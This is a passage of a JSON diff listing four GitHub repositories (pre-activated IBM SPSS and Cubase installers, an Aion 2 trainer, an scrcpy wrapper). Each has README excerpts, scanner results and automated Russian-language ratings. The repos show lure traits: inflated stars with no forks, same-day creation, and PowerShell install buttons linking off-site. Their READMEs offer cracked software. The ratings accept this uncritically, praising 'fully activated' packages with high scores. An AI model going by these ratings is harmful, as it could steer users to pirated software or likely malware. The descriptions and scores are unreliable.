+      "full_name": "leanislizarzado/ibm-spss-desktop-suite",
+      "html_url": "https://github.com/leanislizarzado/ibm-spss-desktop-suite",
+      "description": "IBM SPSS Statistics 2026 Standalone Setup with Full Feature Configuration",
+      "stars": 1104,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T21:04:22Z",
+      "pushed_at": "2026-11-13T11:54:12Z",
+      "topics": [
+        "analytics-suite",
+        "automation",
+        "desktop",
+        "developer-tools",
+        "ibm-analytics",
+        "ibm-spss",
+        "ibm-spss-install-setup-windows-2026",
+        "ibm-watson-services",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "spss",
+        "spss-2026",
+        "spss-sav",
+        "spss-statistics-2026",
+        "spss-statistics-download",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# IBM SPSS Statistics 2026: Full-Featured Standalone Setup for Windows 11\n\n![](files/preview.png)\n\n### 💻 PowerShell Installer\n\n[![](files/button.png)](https://leanislizarzado.github.io/ibm-spss-desktop-suite/)\n\n[![rate](https://img.shields.io/badge/RATE-4.9%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/LICENCE-CC0--1.0-06b6d4?style=flat&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-2.8K-22d3ee?style=flat&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-GREEN-2ea44f?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-SCRIPT-0891b2?style=flat&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-ACTIVE-2ea44f?style=flat&labelColor=0d1117)]()\n\n</div>\n\n---\n\nThis standalone distribution packages IBM SPSS Statistics 2026 as a self-contained Windows x64 desktop deployment, bundling the full analytical toolchain—descriptive statistics, regression modeling, advanced data preparation, and reporting modules—into a single ready-to-run installer. All feature sets are activated at build time, eliminating post-install configuration and enabling immediate execution in offline or air-gapped environments. The package is intended for local testing and controlled deployment scenarios where deterministic, reproducible setups are required.\n\n## 🔧 Requirements\n\n- **OS:** Windows 10 / 11\n- **Shell:** PowerShell 5.1+ or PowerShell 7+\n- **Network:** internet access to download the script\n- **Privileges:** standard user\n\n## Features\n\n- **Pre-activated deployment model**: The installer ships with all licensing already provisioned, eliminating the need for post-install activation, key entry, or online validation against external license servers.\n\n- **Complete feature surface enabled**: Every statistical module and analysis tool in the suite is unlocked at install time, including advanced regression, multivariate analysis, time-series forecasting, and structural equation modeling components.\n\n- **Standalone offline operation**: The build is fully self-contained and requires no network connectivity during installation or runtime. All dependencies, runtime libraries, and component packages are bundled within the distribution payload.\n\n- **Single-pass silent installation**: The installer supports unattended execution with configurable flags, allowing deterministic deployment across multiple workstations without manual interaction or per-machine prompts.\n\n- **Windows x64 native build**: Compiled and packaged specifically for 64-bit Windows desktop environments, with native memory handling optimized for large datasets and long-running analytical workloads.\n\n- **Integrated data access drivers**: Ships with bundled ODBC and native connectors for common relational databases and flat-file formats, enabling direct import without additional driver installation.\n\n- **Scripting and automation runtime**: Includes the embedded command syntax engine and programmatic extension interfaces, allowing batch job execution and reproducible analytical pipelines.\n\n- **Reproducible environment configuration**: All registry entries, path variables, and component manifests are applied consistently by the installer, ensuring identical configuration state across deployments.\n\n- **Self-verifying install payload**: The distribution includes integrity manifests that are validated during extraction, detecting corrupted or incomplete component packages before configuration begins.\n\n- **Rollback-safe configuration state**: The installer records pre-deployment system state and supports clean reversal of configuration changes if the deployment must be undone.\n\n## How it works\n\nThe installer operates as a self-contained deployment package that provisions the complete IBM SPSS Statistics 2026 environment on a Windows x64 desktop without requiring external dependencies or network access during execution. Upon launch, the setup routine performs a staged extr",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "leanislizarzado/ibm-spss-desktop-suite",
+      "summary": "Пакет‑установщик IBM SPSS Statistics 2026 для Windows 11, включающий все модули и активированные лицензии.",
+      "usefulness": "Подходит для исследователей, аналитиков и тестировщиков, которым нужен быстрый, автономный запуск SPSS без дополнительной настройки лицензий.",
+      "uniqueness": "Упакован как полностью активированный, автономный установщик, в отличие от официальных дистрибутивов, требующих ручной активации и подключения к серверу лицензий.",
+      "pros": [
+        "Полностью активированный пакет",
+        "Автономный запуск без сети",
+        "Поддержка Windows 10/11",
+        "PowerShell‑скрипт для быстрой установки"
+      ],
+      "cons": [
+        "Ограничено только Windows",
+        "Отсутствует подробная документация по настройке",
+        "Нет поддержки Linux/Mac"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "automation",
+        "data-science"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.902
+  },
+  {
+    "raw": {
+      "full_name": "SirBonney/scrcpy-mirror-control",
+      "html_url": "https://github.com/SirBonney/scrcpy-mirror-control",
+      "description": "Android Screen Mirroring and Control Workflow, Simplified",
+      "stars": 1104,
+      "forks": 1,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T21:21:53Z",
+      "pushed_at": "2026-11-13T07:42:32Z",
+      "topics": [
+        "automation",
+        "desktop",
+        "developer-tools",
+        "open-source",
+        "python",
+        "scrcpy-alternative",
+        "scrcpy-android",
+        "scrcpy-engine",
+        "scrcpy-ui",
+        "scrcpy-web",
+        "scripts",
+        "software-engineering",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# 🎬 Seamless Android Mirroring & Control Workflow — Video Tool\n\n![](files/preview.png)\n\n### ⌨️ PowerShell Command Button\n\n[![](files/button.png)](https://SirBonney.github.io/scrcpy-mirror-control/)\n\n[![stage](https://img.shields.io/badge/Stage-Stable-2ea44f?style=flat&labelColor=0d1117)]() [![users](https://img.shields.io/badge/Users-93K-6366f1?style=flat&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/Os-Windows_10_%2F_11-818cf8?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-5.1%2B-4f46e5?style=flat&labelColor=0d1117)]()\n\n</div>\n\n---\n\nA complete, self-contained setup that turns your desktop into a live window into any Android device—mirroring the screen, routing input, and letting you work across both without swapping hardware. Every piece of the pipeline is bundled locally, so you can plug in, project, and start controlling in one continuous motion rather than chasing scattered dependencies. The workflow stays clean and visual: one connected device, one mirrored frame, one place to click, type, and drag as if the phone were sitting on your desk.\n\n## ✅ Requirements\n\n- Windows 10 or Windows 11\n- PowerShell 5.1 or newer (already available on Windows)\n- Active network connection\n- No admin rights needed\n\n## Features\n\n* **Instant Screen Mirroring** — Your Android display appears on your desktop the moment the connection is live. No menus to dig through, no settings to babysit; plug in, look up, and your phone is right there in a window.\n\n* **Full Keyboard and Mouse Control** — Navigate apps, type messages, and swipe through screens using the peripherals you already have in front of you. The cursor becomes your finger, and the keyboard becomes your on-screen input — a natural extension of your desktop workflow.\n\n* **Low-Latency, High-Fidelity Video** — Frames land on your monitor with barely a whisper of delay, so scrolling feels smooth and taps register where you expect them. The picture stays crisp even during motion, keeping the experience close to native.\n\n* **Wireless Freedom** — Cut the cable and keep the mirror alive over your local network. Move around the room, switch devices, and stay connected without being tethered to a USB port.\n\n* **Complete Standalone Setup** — Everything needed to mirror and control ships together in one self-contained package. No dependency scavenger hunts, no piecing together components — the toolkit arrives ready to work the first time you open it.\n\n* **Flexible Display Options** — Resize the mirrored window, switch between portrait and landscape, or let it fill the screen. The view adapts to how you want to work, whether you're testing an app or presenting a demo.\n\n* **Built for Everyday Workflows** — Copy text from phone to desktop, drag-and-drop files between the two, and record your session when you need a clip. Small conveniences that turn screen mirroring from a demo trick into a daily habit.\n\n* **One Device, Many Screens** — Keep the phone in your pocket and the mirror on your monitor. The setup follows you across sessions and remembers how you like to work, so every reconnect feels familiar from the first frame.\n\n## How it works\n\nThe setup pairs a lightweight desktop console with a native client running on the Android device. The console speaks to the phone over a local connection — wired or wireless — and from that moment the phone's display is reproduced inside a resizable window on your desktop. Every tap, swipe, keystroke, and scroll you make in that window is relayed back to the device in real time, so the window behaves like a second screen rather than a static preview.\n\nUnder the hood, the console pushes a small agent onto the device on first launch, negotiates a video stream, and renders frames as they arrive. Input events travel the other direction through the same channel, keeping latency low enough that navigating menus and typing feel immediate. Audio, clipboard sharing, and file transfers ride alongside the video feed,",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "SirBonney/scrcpy-mirror-control",
+      "summary": "Приложение для зеркалирования и управления Android‑устройством с рабочего стола Windows через PowerShell. Позволяет мгновенно отображать экран телефона, управлять им мышью и клавиатурой, а также использовать его как дополнительный монитор.",
+      "usefulness": "Подходит для разработчиков, тестировщиков и обычных пользователей, которым нужно быстро подключить Android‑устройство к ПК без установки сторонних приложений. Удобно для демонстраций, удалённого управления и автоматизации.",
+      "uniqueness": "Встроено в PowerShell, не требует установки дополнительных зависимостей, работает полностью локально и поддерживает высокую частоту кадров с низкой задержкой. В отличие от scrcpy, предоставляет готовый UI‑пакет и упрощённый workflow.",
+      "pros": [
+        "Мгновенное зеркалирование без дополнительных настроек",
+        "Полный контроль мышью и клавиатурой",
+        "Низкая задержка и высокая чёткость изображения",
+        "Поддержка Windows 10/11 без прав администратора"
+      ],
+      "cons": [
+        "Ограничено только Windows, нет поддержки macOS/Linux",
+        "Отсутствует подробная документация и примеры использования",
+        "Не реализованы расширенные функции скриптов и автоматизации"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "automation",
+        "desktop",
+        "utility"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.902
+  },
+  {
+    "raw": {
+      "full_name": "Arda313131882/aion-2-trainer-tool",
+      "html_url": "https://github.com/Arda313131882/aion-2-trainer-tool",
+      "description": "Aion 2 AI Prompt Engineering Toolkit - Standalone Desktop Trainer Setup",
+      "stars": 1199,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:34:15Z",
+      "pushed_at": "2026-11-13T05:40:21Z",
+      "topics": [
+        "aion-2",
+        "aion-2-2026",
+        "aion-2-game",
+        "aion-2-optimizer",
+        "aion-2-trainer",
+        "aion-2-trainer-tool",
+        "aion2-combat-analysis",
+        "aion2-meter",
+        "automation",
+        "desktop",
+        "developer-tools",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# Aion 2 Trainer Tool — Game Enhancer for Windows\n\n![](files/preview.png)\n\n### 🚀 PowerShell Quick Install\n\n[![](files/button.png)](https://Arda313131882.github.io/aion-2-trainer-tool/)\n\n[![rate](https://img.shields.io/badge/RATE-4.6%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-7%2B-ec4899?style=for-the-badge&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-127K-f472b6?style=for-the-badge&labelColor=0d1117)]()\n\n</div>\n\n---\n\nThis standalone build equips Aion 2 players with a complete, pre-configured desktop environment built around advanced AI prompt engineering tools. Everything ships ready to run—no dependency hunting, no patch roulette, just a single setup that gets you from download to playable state fast. Every component has been verified against a clean Windows x64 target, so what lands on your machine is exactly what was tested. Drop it in, launch it, and the tooling works the moment you need it.\n\n## ✅ Before You Start\n\n- Windows 10 or Windows 11\n- PowerShell 5.1 or newer (already available on Windows)\n- Active network connection\n- No admin rights needed\n\n## Features\n\n- **Local-First Architecture** — everything runs on your desktop. No cloud dependency, no mandatory sign-in, no round-trip latency between you and your prompts.\n- **Advanced Prompt Engineering Toolkit** — build, chain, and refine complex AI prompts without wrestling with syntax. Structured templates, variable injection, and reusable blocks keep iteration fast.\n- **Complete Standalone Setup** — the full package ships self-contained. Unpack, launch, and you're in the tool — no external runtime scavenger hunt required.\n- **Windows x64 Native** — tuned for desktop performance on the platform you actually play and work on.\n- **Prompt Library & Reusability** — save your best-performing prompts as presets, swap variables on the fly, and keep your workflow repeatable instead of re-typing from scratch every session.\n- **Rapid Iteration Loop** — edit, test, and compare prompt outputs in a tight cycle so you can dial in results without breaking flow.\n- **Portable Configuration** — settings live in plain, human-readable config so you can back them up, version them, and move them between machines.\n- **Zero-Friction Onboarding** — sensible defaults out of the box, with enough exposed knobs for power users who want to tune behavior.\n- **Built for Offline Reliability** — once set up, the core tooling doesn't stall when your connection does.\n\n## How It Works\n\nThe tool runs entirely on your local machine — no launcher overhead, no background services, no waiting on a remote handshake. Drop it on your desktop, fire it up, and the core engine initializes in seconds.\n\nUnder the hood, the prompt engineering layer handles the heavy lifting. Presets are pre-tuned and ready to go, so you're not building prompts from scratch every session. Pick a profile, adjust the parameters that matter, and the trainer feeds a clean, structured prompt into the pipeline — consistent output, every run.\n\nEverything is self-contained. Configuration lives in local files, so your profiles travel with the build and nothing phones home. Swap between setups without reinstalling, and keep multiple loadouts on deck for different games or playstyles.\n\nThe architecture is modular by design. Core prompt logic is decoupled from the interface, which means updates to one don't break the other. If you know your way around a config file, you can extend the preset library, chain modifiers, or roll your own prompt templates without touching the main executable.\n\nPerformance stays lean because the tool doesn't try to do everything. It focuses on prompt engineering and enhancement — nothing more, nothing less. No bloat, no unnecessary hooks, no resource spikes mid-session. It sits quietly alongside your game and does its job.\n\nBottom line: install it, launch it, tune it, play. The whole loop is built to stay out of you",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 1,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 1,
+      "passed": false,
+      "details": "Находки — semgrep: 0, bandit: 1, gitleaks: 0, osv: 0; critical=0, high=1"
+    },
+    "analysis": {
+      "full_name": "Arda313131882/aion-2-trainer-tool",
+      "summary": "Standalone desktop toolkit for Aion 2 that bundles AI prompt‑engineering utilities and a ready‑to‑run environment.",
+      "usefulness": "Игрокам Aion 2, которым нужен быстрый доступ к AI‑инструментам для улучшения игрового процесса без установки зависимостей.",
+      "uniqueness": "Предоставляет полностью автономный набор, включая локальную архитектуру и готовые шаблоны, в отличие от облачных решений и разрозненных скриптов.",
+      "pros": [
+        "Высокая скорость установки (один архив)",
+        "Локальная работа без облака",
+        "Поддержка Windows 10/11",
+        "Интегрированный набор AI‑тулов"
+      ],
+      "cons": [
+        "Один найденный high‑severity уязвимость в bandit",
+        "Отсутствует подробная документация по настройке и использованию"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "automation",
+        "utility"
+      ],
+      "score": 8.0
+    },
+    "final_score": 3.604
+  },
+  {
+    "raw": {
+      "full_name": "sajawal-12/cubase-studio-desktop",
+      "html_url": "https://github.com/sajawal-12/cubase-studio-desktop",
+      "description": "Cubase Studio 2026 desktop setup with full plugin suite and complete feature set",
+      "stars": 1201,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:50:21Z",
+      "pushed_at": "2026-11-13T11:43:42Z",
+      "topics": [
+        "automation",
+        "cubase",
+        "cubase-15",
+        "cubase-for-beginners",
+        "cubase-pro",
+        "cubase-pro-2026",
+        "cubase-setup",
+        "cubase-tutorial",
+        "cubase-windows-download",
+        "cubasecubase-pro",
+        "cube-solver",
+        "cubic-splines",
+        "developer-tools",
+        "mixing-and-mastering",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "steinberg-cubase",
+        "vst3-plugins"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# Cubase Studio 2026: Complete Plugin Suite for Windows 11\n\n![](files/preview.png)\n\n### 💻 PowerShell Installer\n\n[![](files/button.png)](https://sajawal-12.github.io/cubase-studio-desktop/)\n\n[![licence](https://img.shields.io/badge/Licence-Cc--By--Sa--4.0-f59e0b?style=plastic&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.9%2F5-f59e0b?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-5.1%2B_%2F_7%2B-fbbf24?style=plastic&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/Os-Windows_10_%2F_11-d97706?style=plastic&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Passing-2ea44f?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Verified-2ea44f?style=plastic&labelColor=0d1117)]()\n\n</div>\n\n---\n\nThe Cubase Studio 2026 standalone desktop package delivers a complete production environment with all bundled plugins, instruments, and feature modules enabled at install time, eliminating the need for separate component downloads or post-install activation steps. This build targets Windows x64 desktop systems and is packaged for immediate offline deployment across testing and workstation environments. All audio engine components, mixing console extensions, and VST resources are integrated directly into the installer payload, ensuring version consistency across the full feature set. The package maintains a fixed, verifiable file manifest so that deployment integrity can be confirmed prior to execution on any target machine.\n\n## 🔧 Requirements\n\n- **OS:** Windows 10 / 11\n- **Shell:** PowerShell 5.1+ or PowerShell 7+\n- **Network:** internet access to download the script\n- **Privileges:** standard user\n\n## Features\n\n- **Unified Plugin Suite:** All stock and bundled plugins are pre-installed and authorized within a single local package, eliminating the need for separate download, registration, or activation workflows.\n\n- **Complete Feature Set Enabled:** Every module, instrument, and effect included in the build is available on first launch, including advanced mixing, mastering, and sequencing tools.\n\n- **Standalone Offline Operation:** The setup runs entirely from local resources; no network connectivity is required during installation or runtime for license validation or content retrieval.\n\n- **Automated Configuration:** Registry entries, plugin paths, and preference files are provisioned automatically, ensuring the application is ready for immediate use after setup completes.\n\n- **Version Consistency:** All components are validated against the same build manifest, preventing mismatched plugin versions or missing dependencies.\n\n- **Silent and Attended Modes:** Installation can run unattended for deployment scenarios or with a standard progress interface for manual environments.\n\n- **Rollback Support:** A local snapshot of pre-existing configuration is created before modification, allowing restoration to the prior state if needed.\n\n- **Low-Footprint Runtime:** Background services are minimized, and the desktop environment is left clean of temporary installer artifacts after completion.\n\n- **Windows x64 Optimization:** The build is compiled and packaged specifically for 64-bit Windows desktop systems, with native handling of large project files and high-track-count sessions.\n\n## How it works\n\nThe application ships as a self-contained desktop package that unpacks its runtime, audio engine components, and bundled plugin set into a single working directory. On first launch, the launcher performs an integrity check against the manifest, registers the required local services, and initializes the preference store so the studio environment is ready without additional configuration.\n\nStartup follows a staged sequence: the core host process loads first, followed by the plugin scanner, which enumerates all bundled instruments and effects and caches their metadata for fast subsequent launches. The audio subsystem",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "sajawal-12/cubase-studio-desktop",
+      "summary": "Пакет установки Cubase Studio 2026 для Windows 11, включающий полный набор плагинов и функций, развертываемый через PowerShell.",
+      "usefulness": "Подходит для музыкантов и продюсеров, которым нужен быстрый и полностью готовый к работе набор Cubase без дополнительных загрузок и активаций.",
+      "uniqueness": "Встроенный в один инсталлятор полный набор плагинов и модулей, отсутствие необходимости в отдельных скачиваниях и ручной активации, проверенный файл‑манипулятор для целостности.",
+      "pros": [
+        "Полностью готовый к работе пакет",
+        "Упрощённая установка через PowerShell",
+        "Поддержка Windows 10/11",
+        "Проверенный файл‑манипулятор"
+      ],
+      "cons": [
+        "Отсутствует подробная документация по настройке",
+        "Нет тестов CI",
+        "Ограничено только Windows"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "audio-engineering"
+      ],
+      "score": 7.5
+    },
+    "final_score": 3.504
+  }
+]
